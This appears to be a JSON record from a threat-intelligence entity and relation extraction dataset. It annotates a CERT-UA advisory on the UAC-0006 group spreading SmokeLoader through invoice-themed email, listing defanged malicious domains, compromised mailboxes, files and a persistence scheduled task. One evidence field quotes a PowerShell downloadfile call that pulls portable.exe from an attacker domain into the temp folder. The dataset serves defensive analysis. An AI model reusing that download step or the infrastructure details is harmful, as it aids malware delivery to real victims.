@@ -1,0 +1,339 @@
+{
+  "docId": 4555802,
+  "date": "05.05.2023",
+  "title": "Повернення UAC-0006: масове розповсюдження SmokeLoader з використанням тематики \"рахунків\" (CERT-UA#6613)",
+  "entities": [
+    {
+      "id": "4555802:0",
+      "name": "України",
+      "kind": "country",
+      "gloss": "A sovereign country in Eastern Europe.",
+      "scheme": "S6",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4555802:1",
+      "name": "UAC-0006",
+      "kind": "threat actor",
+      "gloss": "A financially motivated cybercriminal group targeting Ukrainian organizations to steal funds via compromised banking credentials.",
+      "scheme": "S19",
+      "category": "HackerGroup",
+      "role": "related"
+    },
+    {
+      "id": "4555802:2",
+      "name": "SmokeLoader",
+      "kind": "malware family",
+      "gloss": "A modular malicious bot program primarily used to download and execute additional malware payloads.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "4555802:3",
+      "name": "PowerShell",
+      "kind": "software product",
+      "gloss": "A task automation and configuration management framework developed by Microsoft.",
+      "scheme": "S1",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "4555802:4",
+      "name": "Windows Script Host",
+      "kind": "software component",
+      "gloss": "A Microsoft Windows component that provides scripting capabilities such as VBScript and JScript.",
+      "scheme": "S17",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4555802:5",
+      "name": "wscript.exe",
+      "kind": "executable file",
+      "gloss": "The command-line and GUI binary for the Windows Script Host.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4555802:6",
+      "name": "pax_2023_ab1058.zip",
+      "kind": "file",
+      "gloss": "A malicious polyglot ZIP archive distributed as an email attachment in cyber attacks.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "4555802:7",
+      "name": "pax_2023_AB1058.pdf",
+      "kind": "file",
+      "gloss": "A decoy PDF document contained within a malicious polyglot ZIP archive.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "4555802:8",
+      "name": "pax_2023_AB1058..js",
+      "kind": "file",
+      "gloss": "A malicious JavaScript loader script extracted from an archive to execute PowerShell commands.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "attacker"
+    },
+    {
+      "id": "4555802:9",
+      "name": "portable.exe",
+      "kind": "file",
+      "gloss": "A malicious executable file downloaded to launch the SmokeLoader payload.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "attacker"
+    },
+    {
+      "id": "4555802:10",
+      "name": "smoke.exe",
+      "kind": "file",
+      "gloss": "An executable binary containing the SmokeLoader malware payload.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4555802:11",
+      "name": "Firefox Default Browser Agent D0D690C3E3EC0AB0",
+      "kind": "scheduled task",
+      "gloss": "A scheduled task created by malware to maintain persistence under the disguise of a legitimate browser task.",
+      "scheme": null,
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "4555802:12",
+      "name": "beliy@atl.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to distribute malicious spam.",
+      "scheme": "S14",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:13",
+      "name": "inbox6@dl.kr-admin.gov.ua",
+      "kind": "email address",
+      "gloss": "A compromised email address used to send malicious email messages.",
+      "scheme": "S14",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:14",
+      "name": "nvn@mayak.dp.ua",
+      "kind": "email address",
+      "gloss": "A compromised email account used to propagate malicious messages.",
+      "scheme": "S14",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:15",
+      "name": "homospoison[.]ru",
+      "kind": "internet domain",
+      "gloss": "A malicious internet domain used to host executable payloads.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "4555802:16",
+      "name": "3dstore[.]pro",
+      "kind": "internet domain",
+      "gloss": "A domain identified as network infrastructure related to the malicious campaign.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:17",
+      "name": "balkimotion[.]ru",
+      "kind": "internet domain",
+      "gloss": "A malicious internet domain associated with threat actor operations.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:18",
+      "name": "coudzoom[.]ru",
+      "kind": "internet domain",
+      "gloss": "An internet domain used in cyber threat operations.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:19",
+      "name": "criticalosl[.]tech",
+      "kind": "internet domain",
+      "gloss": "An internet domain associated with cyber threat activity.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:20",
+      "name": "humanitarydp[.]ug",
+      "kind": "internet domain",
+      "gloss": "A malicious domain identified in the incident campaign.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:21",
+      "name": "ipodromlan[.]ru",
+      "kind": "internet domain",
+      "gloss": "A domain linked to malicious cyber infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:22",
+      "name": "lamazone[.]site",
+      "kind": "internet domain",
+      "gloss": "An internet domain associated with malicious network activity.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:23",
+      "name": "ligaspace[.]ru",
+      "kind": "internet domain",
+      "gloss": "A domain name identified as part of threat infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:24",
+      "name": "maximprofile[.]net",
+      "kind": "internet domain",
+      "gloss": "A network domain identified as an indicator of compromise.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:25",
+      "name": "redport80[.]ru",
+      "kind": "internet domain",
+      "gloss": "A domain associated with the malicious campaign.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:26",
+      "name": "shopersport[.]ru",
+      "kind": "internet domain",
+      "gloss": "An internet domain identified in malicious operations.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:27",
+      "name": "sindoproperty[.]org",
+      "kind": "internet domain",
+      "gloss": "An internet domain linked to threat actor activity.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:28",
+      "name": "superboler[.]com",
+      "kind": "internet domain",
+      "gloss": "A malicious internet domain associated with the campaign.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:29",
+      "name": "zaliphone[.]com",
+      "kind": "internet domain",
+      "gloss": "A domain identified as an indicator of compromise in the incident.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "4555802:30",
+      "name": "193[.]106.175.177",
+      "kind": "ip address",
+      "gloss": "An IP address identified as threat infrastructure.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0006",
+      "type": "associated-with-activity",
+      "tail": "SmokeLoader",
+      "evidence": "активність групи UAC-0006... здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "contains-file",
+      "tail": "pax_2023_AB1058..js",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку та JavaScript-файл \"pax_2023_AB1058..js\""
+    },
+    {
+      "head": "pax_2023_ab1058.zip",
+      "type": "contains-file",
+      "tail": "pax_2023_AB1058.pdf",
+      "evidence": "ZIP-архів є файлом-поліглотом, що містить документ-приманку"
+    },
+    {
+      "head": "pax_2023_AB1058..js",
+      "type": "uses-tool",
+      "tail": "PowerShell",
+      "evidence": "JavaScript-файл \"pax_2023_AB1058..js\", який, використовуючи PowerShell"
+    },
+    {
+      "head": "pax_2023_AB1058..js",
+      "type": "downloads-payload",
+      "tail": "portable.exe",
+      "evidence": "забезпечить завантаження та запуск виконуваного файлу \"portable.exe\""
+    },
+    {
+      "head": "portable.exe",
+      "type": "executes",
+      "tail": "SmokeLoader",
+      "evidence": "\"portable.exe\". Останній, у свою чергу, здійснить запуск шкідливої програми SmokeLoader"
+    },
+    {
+      "head": "SmokeLoader",
+      "type": "establishes-persistence-via",
+      "tail": "Firefox Default Browser Agent D0D690C3E3EC0AB0",
+      "evidence": "Персистентність запуску SmokeLoader буде забезпечено шляхом створення запланованого завдання, наприклад: \"C:\\Windows\\System32\\Tasks\\Firefox Default Browser Agent D0D690C3E3EC0AB0\""
+    },
+    {
+      "head": "homospoison[.]ru",
+      "type": "hosts",
+      "tail": "portable.exe",
+      "evidence": "downloadfile('hxxp://homospoison[.]ru/one/portable.exe','%%temp%%gEq94.exe')"
+    }
+  ],
+  "unclassified": [
+    "4555802:11"
+  ]
+}
